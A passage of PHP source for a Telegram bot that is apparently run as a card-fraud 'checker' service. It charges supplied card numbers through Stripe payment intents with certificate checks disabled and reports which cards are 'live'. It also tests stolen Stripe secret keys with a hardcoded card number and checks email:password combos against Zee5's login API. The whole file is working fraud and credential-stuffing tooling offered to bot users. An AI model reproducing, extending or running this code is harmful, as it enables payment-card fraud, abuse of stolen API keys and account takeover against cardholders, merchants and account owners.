    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=Gunnu Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
    $result2 = curl_exec($ch);
    $msg2 = Getstr($result2,'"message": "','"');
    $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
    if(strpos($result2, '"seller_message": "Payment complete."' )) {
    sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Charged $$amt  ✅</b>%0A<b>Gateway-» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>Checked By -» @$usernam</b>%0A<b>Bot -» @eslamcheckerbot</b>%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE</b>", $message_id);
    }
    elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3DS2 REQUIRED</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge $$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        else {
        sendMessage($chatId, "<b>Try other gates or send correct format%0A<code>cc|mm|yy|cvc</code></b>", $message_id);};}
        
    else{
        sendMessage($chatId, "<b>You/this chat is not Authorised, Join @eslamchk to use Bot for free or Contact @EuxxxuE to get Premium%0A⋆Bot by --»[GUNNU]⛈</b>", $message_id);
        }
        }
    
    


//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "/sk") === 0)||(strpos($message, "!sk") === 0)||(strpos($message, ".sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Rate Limited Key%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
};}

elseif (strpos($message, "/key") === 0){
$sec = substr($message, 5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Rate Limited Key%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
};}

elseif (strpos($message, "sk_live") === 0){
$sec = substr($message, 0);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>⚠️ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Rate Limited Key%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot by --»[GUNNU]⛈%0A@EuxxxuE </b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot by --»[GUNNU]⛈%0A@EuxxxuE </b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);

    
};}
//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
sendMessage($chatId, "<b>ZEE5 Account-»</b>%0A<b>⋆Combo-»</b> <code>$combo</code>%0A<b>⋆Response-»</b> <b>Successfully Logged in</b>%0A<b>⋆Checked By-»</b> @$username%0A%0A<b>⋆Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
}else{
sendMessage($chatId, "<b>⋆Combo-»</b> <code>$combo</code>%0A<b>⋆Response-»</b> <b>Wrong Email or Password</b>%0A<b>⋆Checked By-»</b> @$username%0A%0A<b>⋆Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>", $message_id);
};
curl_close($ch);
ob_flush();
}

////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};



    
////////////////=============[ẸŜĹÃϻ ẸĴỖЌẸŘ ẸĞ]=============////////////////
////////==========[Join @eslamchk for more]==========////////

?>







